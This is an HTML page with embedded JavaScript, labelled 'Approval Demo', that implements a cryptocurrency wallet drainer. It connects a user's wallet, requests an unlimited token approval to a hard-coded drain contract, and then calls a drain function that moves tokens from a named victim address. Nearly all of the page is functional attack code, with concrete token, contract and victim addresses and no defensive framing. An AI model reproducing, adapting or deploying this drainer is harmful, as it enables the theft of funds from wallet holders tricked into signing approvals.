<!DOCTYPE html>
<html>
<head>
  <title>Approval Demo</title>
</head>

<body style="font-family:sans-serif">

<h2>Demo: Connect → Approve → Drain</h2>

<button onclick="connect()">Connect Wallet</button><br><br>
<button onclick="approve()">Approve Token</button><br><br>
<button onclick="drain()">Drain Tokens</button>

<script>
let provider, signer, userAddress, ethersLib;

// 🔥 Load ethers dynamically
async function loadEthers() {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js";

    script.onload = () => {
      ethersLib = window.ethers;
      console.log("Ethers loaded:", ethersLib);
      resolve();
    };

    script.onerror = reject;
    document.head.appendChild(script);
  });
}

// Initialize on load
window.onload = async () => {
  await loadEthers();
};

// CONFIG
const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const tokenABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const drainABI = [
  "function drain(address token, address victim, uint256 amount) public"
];

// CONNECT
async function connect() {
  try {
    if (!window.ethereum) {
      alert("Open inside Trust Wallet browser");
      return;
    }

    if (!ethersLib) {
      alert("Ethers not loaded yet, wait 1 sec and retry");
      return;
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });

    provider = new ethersLib.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    userAddress = await signer.getAddress();

    alert("✅ Connected: " + userAddress);

  } catch (e) {
    alert("❌ Connect error: " + e.message);
  }
}

// APPROVE
async function approve() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    const contract = new ethersLib.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.approve(
      drainAddress,
      ethersLib.constants.MaxUint256
    );

    await tx.wait();

    alert("✅ Approved");

  } catch (e) {
    alert("❌ Approve error: " + e.message);
  }
}

// DRAIN
async function drain() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    const contract = new ethersLib.Contract(drainAddress, drainABI, signer);

    const tx = await contract.drain(
      tokenAddress,
      victimAddress,
      ethersLib.utils.parseUnits("1000", 18)
    );

    await tx.wait();

    alert("💣 Drain executed");

  } catch (e) {
    alert("❌ Drain error: " + e.message);
  }
}
</script>

</body>
</html>
